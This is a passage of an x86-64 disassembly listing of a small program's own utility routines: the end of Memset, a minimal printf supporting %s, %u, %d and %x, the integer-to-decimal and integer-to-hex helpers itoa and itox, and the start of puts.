  40241c:	89 f0                	mov    eax,esi
  40241e:	89 55 e0             	mov    DWORD PTR [rbp-0x20],edx
  402421:	88 45 e4             	mov    BYTE PTR [rbp-0x1c],al
  402424:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402428:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40242c:	8b 45 e0             	mov    eax,DWORD PTR [rbp-0x20]
  40242f:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
  402432:	eb 0f                	jmp    402443 <Memset+0x33>
  402434:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402438:	0f b6 55 e4          	movzx  edx,BYTE PTR [rbp-0x1c]
  40243c:	88 10                	mov    BYTE PTR [rax],dl
  40243e:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402443:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  402446:	8d 50 ff             	lea    edx,[rax-0x1]
  402449:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  40244c:	85 c0                	test   eax,eax
  40244e:	75 e4                	jne    402434 <Memset+0x24>
  402450:	90                   	nop
  402451:	90                   	nop
  402452:	5d                   	pop    rbp
  402453:	c3                   	ret    

0000000000402454 <_printf>:
  402454:	f3 0f 1e fa          	endbr64 
  402458:	55                   	push   rbp
  402459:	48 89 e5             	mov    rbp,rsp
  40245c:	48 81 ec 10 01 00 00 	sub    rsp,0x110
  402463:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  40246a:	48 89 b5 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rsi
  402471:	48 89 95 60 ff ff ff 	mov    QWORD PTR [rbp-0xa0],rdx
  402478:	48 89 8d 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rcx
  40247f:	4c 89 85 70 ff ff ff 	mov    QWORD PTR [rbp-0x90],r8
  402486:	4c 89 8d 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],r9
  40248d:	84 c0                	test   al,al
  40248f:	74 20                	je     4024b1 <_printf+0x5d>
  402491:	0f 29 45 80          	movaps XMMWORD PTR [rbp-0x80],xmm0
  402495:	0f 29 4d 90          	movaps XMMWORD PTR [rbp-0x70],xmm1
  402499:	0f 29 55 a0          	movaps XMMWORD PTR [rbp-0x60],xmm2
  40249d:	0f 29 5d b0          	movaps XMMWORD PTR [rbp-0x50],xmm3
  4024a1:	0f 29 65 c0          	movaps XMMWORD PTR [rbp-0x40],xmm4
  4024a5:	0f 29 6d d0          	movaps XMMWORD PTR [rbp-0x30],xmm5
  4024a9:	0f 29 75 e0          	movaps XMMWORD PTR [rbp-0x20],xmm6
  4024ad:	0f 29 7d f0          	movaps XMMWORD PTR [rbp-0x10],xmm7
  4024b1:	48 c7 85 20 ff ff ff 	mov    QWORD PTR [rbp-0xe0],0x0
  4024b8:	00 00 00 00 
  4024bc:	48 c7 85 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],0x0
  4024c3:	00 00 00 00 
  4024c7:	48 c7 85 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],0x0
  4024ce:	00 00 00 00 
  4024d2:	66 c7 85 38 ff ff ff 	mov    WORD PTR [rbp-0xc8],0x0
  4024d9:	00 00 
  4024db:	c7 85 08 ff ff ff 08 	mov    DWORD PTR [rbp-0xf8],0x8
  4024e2:	00 00 00 
  4024e5:	c7 85 0c ff ff ff 30 	mov    DWORD PTR [rbp-0xf4],0x30
  4024ec:	00 00 00 
  4024ef:	48 8d 45 10          	lea    rax,[rbp+0x10]
  4024f3:	48 89 85 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rax
  4024fa:	48 8d 85 50 ff ff ff 	lea    rax,[rbp-0xb0]
  402501:	48 89 85 18 ff ff ff 	mov    QWORD PTR [rbp-0xe8],rax
  402508:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40250f:	00 00 00 
  402512:	e9 6d 02 00 00       	jmp    402784 <_printf+0x330>
  402517:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40251e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402521:	3c 25                	cmp    al,0x25
  402523:	74 31                	je     402556 <_printf+0x102>
  402525:	83 bd 4c ff ff ff 00 	cmp    DWORD PTR [rbp-0xb4],0x0
  40252c:	75 28                	jne    402556 <_printf+0x102>
  40252e:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402535:	ba 01 00 00 00       	mov    edx,0x1
  40253a:	48 89 c6             	mov    rsi,rax
  40253d:	bf 01 00 00 00       	mov    edi,0x1
  402542:	e8 b9 fb ff ff       	call   402100 <_write>
  402547:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40254e:	00 00 00 
  402551:	e9 26 02 00 00       	jmp    40277c <_printf+0x328>
  402556:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40255d:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402560:	3c 25                	cmp    al,0x25
  402562:	0f 84 0a 02 00 00    	je     402772 <_printf+0x31e>
  402568:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40256f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402572:	0f be c0             	movsx  eax,al
  402575:	83 f8 78             	cmp    eax,0x78
  402578:	0f 84 61 01 00 00    	je     4026df <_printf+0x28b>
  40257e:	83 f8 78             	cmp    eax,0x78
  402581:	0f 8f c5 01 00 00    	jg     40274c <_printf+0x2f8>
  402587:	83 f8 75             	cmp    eax,0x75
  40258a:	74 79                	je     402605 <_printf+0x1b1>
  40258c:	83 f8 75             	cmp    eax,0x75
  40258f:	0f 8f b7 01 00 00    	jg     40274c <_printf+0x2f8>
  402595:	83 f8 64             	cmp    eax,0x64
  402598:	0f 84 d4 00 00 00    	je     402672 <_printf+0x21e>
  40259e:	83 f8 73             	cmp    eax,0x73
  4025a1:	0f 85 a5 01 00 00    	jne    40274c <_printf+0x2f8>
  4025a7:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4025ad:	83 f8 2f             	cmp    eax,0x2f
  4025b0:	77 23                	ja     4025d5 <_printf+0x181>
  4025b2:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4025b9:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4025bf:	89 d2                	mov    edx,edx
  4025c1:	48 01 d0             	add    rax,rdx
  4025c4:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4025ca:	83 c2 08             	add    edx,0x8
  4025cd:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  4025d3:	eb 12                	jmp    4025e7 <_printf+0x193>
  4025d5:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4025dc:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4025e0:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4025e7:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4025ea:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  4025f1:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4025f8:	48 89 c7             	mov    rdi,rax
  4025fb:	e8 cd 04 00 00       	call   402acd <_puts>
  402600:	e9 61 01 00 00       	jmp    402766 <_printf+0x312>
  402605:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  40260b:	83 f8 2f             	cmp    eax,0x2f
  40260e:	77 23                	ja     402633 <_printf+0x1df>
  402610:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402617:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40261d:	89 d2                	mov    edx,edx
  40261f:	48 01 d0             	add    rax,rdx
  402622:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402628:	83 c2 08             	add    edx,0x8
  40262b:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  402631:	eb 12                	jmp    402645 <_printf+0x1f1>
  402633:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  40263a:	48 8d 50 08          	lea    rdx,[rax+0x8]
  40263e:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402645:	8b 00                	mov    eax,DWORD PTR [rax]
  402647:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  40264d:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  402653:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  40265a:	48 89 d6             	mov    rsi,rdx
  40265d:	48 89 c7             	mov    rdi,rax
  402660:	e8 38 01 00 00       	call   40279d <itoa>
  402665:	48 89 c7             	mov    rdi,rax
  402668:	e8 60 04 00 00       	call   402acd <_puts>
  40266d:	e9 f4 00 00 00       	jmp    402766 <_printf+0x312>
  402672:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402678:	83 f8 2f             	cmp    eax,0x2f
  40267b:	77 23                	ja     4026a0 <_printf+0x24c>
  40267d:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402684:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40268a:	89 d2                	mov    edx,edx
  40268c:	48 01 d0             	add    rax,rdx
  40268f:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402695:	83 c2 08             	add    edx,0x8
  402698:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40269e:	eb 12                	jmp    4026b2 <_printf+0x25e>
  4026a0:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4026a7:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4026ab:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4026b2:	8b 00                	mov    eax,DWORD PTR [rax]
  4026b4:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  4026ba:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  4026c0:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  4026c7:	48 89 d6             	mov    rsi,rdx
  4026ca:	48 89 c7             	mov    rdi,rax
  4026cd:	e8 cb 00 00 00       	call   40279d <itoa>
  4026d2:	48 89 c7             	mov    rdi,rax
  4026d5:	e8 f3 03 00 00       	call   402acd <_puts>
  4026da:	e9 87 00 00 00       	jmp    402766 <_printf+0x312>
  4026df:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4026e5:	83 f8 2f             	cmp    eax,0x2f
  4026e8:	77 23                	ja     40270d <_printf+0x2b9>
  4026ea:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4026f1:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026f7:	89 d2                	mov    edx,edx
  4026f9:	48 01 d0             	add    rax,rdx
  4026fc:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402702:	83 c2 08             	add    edx,0x8
  402705:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40270b:	eb 12                	jmp    40271f <_printf+0x2cb>
  40270d:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402714:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402718:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  40271f:	48 8b 00             	mov    rax,QWORD PTR [rax]
  402722:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  402729:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  402730:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  402737:	48 89 d6             	mov    rsi,rdx
  40273a:	48 89 c7             	mov    rdi,rax
  40273d:	e8 dd 01 00 00       	call   40291f <itox>
  402742:	48 89 c7             	mov    rdi,rax
  402745:	e8 83 03 00 00       	call   402acd <_puts>
  40274a:	eb 1a                	jmp    402766 <_printf+0x312>
  40274c:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402753:	ba 01 00 00 00       	mov    edx,0x1
  402758:	48 89 c6             	mov    rsi,rax
  40275b:	bf 01 00 00 00       	mov    edi,0x1
  402760:	e8 9b f9 ff ff       	call   402100 <_write>
  402765:	90                   	nop
  402766:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40276d:	00 00 00 
  402770:	eb 0a                	jmp    40277c <_printf+0x328>
  402772:	c7 85 4c ff ff ff 01 	mov    DWORD PTR [rbp-0xb4],0x1
  402779:	00 00 00 
  40277c:	48 83 85 f8 fe ff ff 	add    QWORD PTR [rbp-0x108],0x1
  402783:	01 
  402784:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40278b:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40278e:	84 c0                	test   al,al
  402790:	0f 85 81 fd ff ff    	jne    402517 <_printf+0xc3>
  402796:	b8 01 00 00 00       	mov    eax,0x1
  40279b:	c9                   	leave  
  40279c:	c3                   	ret    

000000000040279d <itoa>:
  40279d:	f3 0f 1e fa          	endbr64 
  4027a1:	55                   	push   rbp
  4027a2:	48 89 e5             	mov    rbp,rsp
  4027a5:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4027a9:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4027ad:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4027b4:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  4027b8:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  4027bf:	66 66 66 
  4027c2:	48 89 c8             	mov    rax,rcx
  4027c5:	48 f7 ea             	imul   rdx
  4027c8:	48 c1 fa 02          	sar    rdx,0x2
  4027cc:	48 89 c8             	mov    rax,rcx
  4027cf:	48 c1 f8 3f          	sar    rax,0x3f
  4027d3:	48 29 c2             	sub    rdx,rax
  4027d6:	48 89 d0             	mov    rax,rdx
  4027d9:	48 c1 e0 02          	shl    rax,0x2
  4027dd:	48 01 d0             	add    rax,rdx
  4027e0:	48 01 c0             	add    rax,rax
  4027e3:	48 29 c1             	sub    rcx,rax
  4027e6:	48 89 ca             	mov    rdx,rcx
  4027e9:	89 d0                	mov    eax,edx
  4027eb:	8d 48 30             	lea    ecx,[rax+0x30]
  4027ee:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4027f1:	48 63 d0             	movsxd rdx,eax
  4027f4:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4027f8:	48 01 d0             	add    rax,rdx
  4027fb:	89 ca                	mov    edx,ecx
  4027fd:	88 10                	mov    BYTE PTR [rax],dl
  4027ff:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  402803:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  40280a:	66 66 66 
  40280d:	48 89 c8             	mov    rax,rcx
  402810:	48 f7 ea             	imul   rdx
  402813:	48 c1 fa 02          	sar    rdx,0x2
  402817:	48 89 c8             	mov    rax,rcx
  40281a:	48 c1 f8 3f          	sar    rax,0x3f
  40281e:	48 29 c2             	sub    rdx,rax
  402821:	48 89 d0             	mov    rax,rdx
  402824:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402828:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40282c:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402831:	75 81                	jne    4027b4 <itoa+0x17>
  402833:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402836:	48 63 d0             	movsxd rdx,eax
  402839:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40283d:	48 01 d0             	add    rax,rdx
  402840:	c6 00 00             	mov    BYTE PTR [rax],0x0
  402843:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  40284a:	e9 b5 00 00 00       	jmp    402904 <itoa+0x167>
  40284f:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402852:	48 63 d0             	movsxd rdx,eax
  402855:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402859:	48 01 d0             	add    rax,rdx
  40285c:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  40285f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402862:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402865:	48 98                	cdqe   
  402867:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  40286b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40286f:	48 01 d0             	add    rax,rdx
  402872:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402875:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402878:	48 63 d0             	movsxd rdx,eax
  40287b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40287f:	48 01 d0             	add    rax,rdx
  402882:	31 ce                	xor    esi,ecx
  402884:	89 f2                	mov    edx,esi
  402886:	88 10                	mov    BYTE PTR [rax],dl
  402888:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40288b:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  40288e:	48 98                	cdqe   
  402890:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402894:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402898:	48 01 d0             	add    rax,rdx
  40289b:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  40289e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028a1:	48 63 d0             	movsxd rdx,eax
  4028a4:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028a8:	48 01 d0             	add    rax,rdx
  4028ab:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028ae:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028b1:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028b4:	48 98                	cdqe   
  4028b6:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028ba:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028be:	48 01 d0             	add    rax,rdx
  4028c1:	31 ce                	xor    esi,ecx
  4028c3:	89 f2                	mov    edx,esi
  4028c5:	88 10                	mov    BYTE PTR [rax],dl
  4028c7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028ca:	48 63 d0             	movsxd rdx,eax
  4028cd:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028d1:	48 01 d0             	add    rax,rdx
  4028d4:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028d7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028da:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  4028dd:	48 98                	cdqe   
  4028df:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  4028e3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028e7:	48 01 d0             	add    rax,rdx
  4028ea:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  4028ed:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028f0:	48 63 d0             	movsxd rdx,eax
  4028f3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028f7:	48 01 d0             	add    rax,rdx
  4028fa:	31 ce                	xor    esi,ecx
  4028fc:	89 f2                	mov    edx,esi
  4028fe:	88 10                	mov    BYTE PTR [rax],dl
  402900:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402904:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402907:	89 c2                	mov    edx,eax
  402909:	c1 ea 1f             	shr    edx,0x1f
  40290c:	01 d0                	add    eax,edx
  40290e:	d1 f8                	sar    eax,1
  402910:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402913:	0f 8c 36 ff ff ff    	jl     40284f <itoa+0xb2>
  402919:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40291d:	5d                   	pop    rbp
  40291e:	c3                   	ret    

000000000040291f <itox>:
  40291f:	f3 0f 1e fa          	endbr64 
  402923:	55                   	push   rbp
  402924:	48 89 e5             	mov    rbp,rsp
  402927:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40292b:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40292f:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402936:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40293a:	48 99                	cqo    
  40293c:	48 c1 ea 3c          	shr    rdx,0x3c
  402940:	48 01 d0             	add    rax,rdx
  402943:	83 e0 0f             	and    eax,0xf
  402946:	48 29 d0             	sub    rax,rdx
  402949:	48 89 c1             	mov    rcx,rax
  40294c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40294f:	48 63 d0             	movsxd rdx,eax
  402952:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402956:	48 01 d0             	add    rax,rdx
  402959:	89 ca                	mov    edx,ecx
  40295b:	88 10                	mov    BYTE PTR [rax],dl
  40295d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402960:	48 63 d0             	movsxd rdx,eax
  402963:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402967:	48 01 d0             	add    rax,rdx
  40296a:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40296d:	3c 09                	cmp    al,0x9
  40296f:	7e 26                	jle    402997 <itox+0x78>
  402971:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402974:	48 63 d0             	movsxd rdx,eax
  402977:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40297b:	48 01 d0             	add    rax,rdx
  40297e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402981:	8d 48 57             	lea    ecx,[rax+0x57]
  402984:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402987:	48 63 d0             	movsxd rdx,eax
  40298a:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40298e:	48 01 d0             	add    rax,rdx
  402991:	89 ca                	mov    edx,ecx
  402993:	88 10                	mov    BYTE PTR [rax],dl
  402995:	eb 24                	jmp    4029bb <itox+0x9c>
  402997:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40299a:	48 63 d0             	movsxd rdx,eax
  40299d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029a1:	48 01 d0             	add    rax,rdx
  4029a4:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4029a7:	8d 48 30             	lea    ecx,[rax+0x30]
  4029aa:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029ad:	48 63 d0             	movsxd rdx,eax
  4029b0:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029b4:	48 01 d0             	add    rax,rdx
  4029b7:	89 ca                	mov    edx,ecx
  4029b9:	88 10                	mov    BYTE PTR [rax],dl
  4029bb:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4029bf:	48 8d 50 0f          	lea    rdx,[rax+0xf]
  4029c3:	48 85 c0             	test   rax,rax
  4029c6:	48 0f 48 c2          	cmovs  rax,rdx
  4029ca:	48 c1 f8 04          	sar    rax,0x4
  4029ce:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4029d2:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4029d6:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  4029db:	0f 85 55 ff ff ff    	jne    402936 <itox+0x17>
  4029e1:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029e4:	48 63 d0             	movsxd rdx,eax
  4029e7:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029eb:	48 01 d0             	add    rax,rdx
  4029ee:	c6 00 00             	mov    BYTE PTR [rax],0x0
  4029f1:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  4029f8:	e9 b5 00 00 00       	jmp    402ab2 <itox+0x193>
  4029fd:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a00:	48 63 d0             	movsxd rdx,eax
  402a03:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a07:	48 01 d0             	add    rax,rdx
  402a0a:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a0d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a10:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a13:	48 98                	cdqe   
  402a15:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a19:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a1d:	48 01 d0             	add    rax,rdx
  402a20:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a23:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a26:	48 63 d0             	movsxd rdx,eax
  402a29:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a2d:	48 01 d0             	add    rax,rdx
  402a30:	31 ce                	xor    esi,ecx
  402a32:	89 f2                	mov    edx,esi
  402a34:	88 10                	mov    BYTE PTR [rax],dl
  402a36:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a39:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a3c:	48 98                	cdqe   
  402a3e:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a42:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a46:	48 01 d0             	add    rax,rdx
  402a49:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a4c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a4f:	48 63 d0             	movsxd rdx,eax
  402a52:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a56:	48 01 d0             	add    rax,rdx
  402a59:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a5c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a5f:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a62:	48 98                	cdqe   
  402a64:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a68:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a6c:	48 01 d0             	add    rax,rdx
  402a6f:	31 ce                	xor    esi,ecx
  402a71:	89 f2                	mov    edx,esi
  402a73:	88 10                	mov    BYTE PTR [rax],dl
  402a75:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a78:	48 63 d0             	movsxd rdx,eax
  402a7b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a7f:	48 01 d0             	add    rax,rdx
  402a82:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402a85:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a88:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402a8b:	48 98                	cdqe   
  402a8d:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402a91:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a95:	48 01 d0             	add    rax,rdx
  402a98:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402a9b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a9e:	48 63 d0             	movsxd rdx,eax
  402aa1:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aa5:	48 01 d0             	add    rax,rdx
  402aa8:	31 ce                	xor    esi,ecx
  402aaa:	89 f2                	mov    edx,esi
  402aac:	88 10                	mov    BYTE PTR [rax],dl
  402aae:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402ab2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402ab5:	89 c2                	mov    edx,eax
  402ab7:	c1 ea 1f             	shr    edx,0x1f
  402aba:	01 d0                	add    eax,edx
  402abc:	d1 f8                	sar    eax,1
  402abe:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402ac1:	0f 8c 36 ff ff ff    	jl     4029fd <itox+0xde>
  402ac7:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402acb:	5d                   	pop    rbp
  402acc:	c3                   	ret    

0000000000402acd <_puts>:
  402acd:	f3 0f 1e fa          	endbr64 
  402ad1:	55                   	push   rbp
  402ad2:	48 89 e5             	mov    rbp,rsp
  402ad5:	48 83 ec 10          	sub    rsp,0x10
  402ad9:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402add:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402ae1:	48 89 c7             	mov    rdi,rax
  402ae4:	e8 7c 00 00 00       	call   402b65 <_strlen>
  402ae9:	48 89 c2             	mov    rdx,rax
  402aec:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
